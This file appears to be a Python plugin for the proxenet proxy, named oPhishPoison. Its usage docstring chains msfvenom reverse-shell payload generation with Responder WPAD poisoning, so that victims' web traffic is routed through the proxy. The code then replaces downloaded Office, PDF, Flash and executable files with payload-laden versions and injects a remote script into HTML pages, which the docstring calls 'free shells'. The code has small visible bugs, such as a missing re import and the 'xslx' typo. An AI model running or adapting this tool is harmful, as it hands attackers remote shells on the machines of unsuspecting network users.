"""
This script will inject malicious content.

How to use:
- Generate your custom payload using msfvenom
  ex: $ msfvenom -p windows/reverse_tcp_shell -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
- Edit your proxenet config file to point to your payload (option 'msfpayload')
- Start proxenet and load this script (autoload or manually)
  ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
      $ ./proxenet -b 192.168.56.1 -p 8008
- Start Responder and point WPAD to proxenet
  ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008
- Enjoy the free shells

"""

PLUGIN_NAME   = "oPhishPoison"
AUTHOR        = "@_hugsy_"


import os, subprocess, ConfigParser
from pimp import HTTPResponse, HTTPBadResponseException

HOME = os.getenv( "HOME" )
CONFIG_FILE = os.getenv("HOME") + "/.proxenet.ini"

config = ConfigParser.ConfigParser()
config.read(CONFIG_FILE)
path_to_msfpayload   = config.get(PLUGIN_NAME, "msfpayload")
path_to_python       = config.get(PLUGIN_NAME, "python")
path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload")
path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub")

file_cache = {}

types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
         "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
         "doc": "application/msword",
         "xls": "application/msexcel",
         "ppt": "application/vnd.ms-powerpoint",
         "pdf": "application/pdf",
         "swf": "application/x-shockwave-flash",
         "exe": "application/x-msdos-program",
         "html": "application/html",
         }


def is_supported_type(t):
    """
    Checks if the content type is supported by our poisoining plugins. If not, the request will
    not be tampered.
    """
    for k,v in types.iteritems():
        if v.lower() == t.lower():  return k
    return None


def hit_cache(ctype):
    """
    Tried to get the right file from the cache.
    """
    res = file_cache.get(ctype, None)
    if res is None:
        return False

    if not os.access(res, os.R_OK):
        return False

    return res


def replace_with_malicious(http, ctype):
    """
    1. generate on-the-fly the right payload
    2. replace the HTTP response body
    3. profit
    """

    # 1.
    cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
    if   ctype in ("xslx", "xls"):  cmd += "--excel"
    elif ctype in ("docx", "doc"):  cmd += "--word"
    elif ctype in ("pptx", "ppt"):  cmd += "--powerpoint"
    elif ctype == "pdf":            cmd += "--pdf"
    elif ctype == "swf":            cmd += "--flash"

    res = hit_cache(ctype)
    if res == False:
        try:
            with open(path_to_msfpayload, "rb") as f:
                p = subprocess.Popen(cmd.split(" "), stdin=f)
                res = p.communicate()[0]
            file_cache[ctype] = res
        except Exception as e:
            print("Payload generation failed: %s" % e)
            return False

    # 2.
    with open(res, "rb") as f:
        http.body = f.read()

    # 3.
    return True


def inject_html(http):
    pattern = "(</body>)"
    script = "<script src=\"{}\"></script>".format( path_to_html )
    repl = "{}\1".format( script )
    new_page = re.sub(pattern, repl, http.body, count=1, flags=re.IGNORECASE)

    http.body = new_page
    return http.render()


def proxenet_request_hook(rid, request, uri):
    """
    proxenet_request_hook() is not useful now, maybe later.
    """
    return request


def proxenet_response_hook(rid, response, uri):
    """
    When a HTTP response header is received, check if it has a supported content type.
    If so, inject our payload.
    """
    try:
        http = HTTPResponse(response)

        if not http.has_header("Content-Type"):
            del(http)
            return response

        detected_type = is_supported_type( http.get_header("Content-Type") )
        if detected_type is None:
            del(http)
            return response

        if detected_type == "html":
            return inject_html(http)

        if replace_with_malicious(http, detected_type) == False:
            del(http)
            return response

        print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
        return http.render()

    except HTTPBadResponseException as e :
        return response


if __name__ == "__main__":
    pass
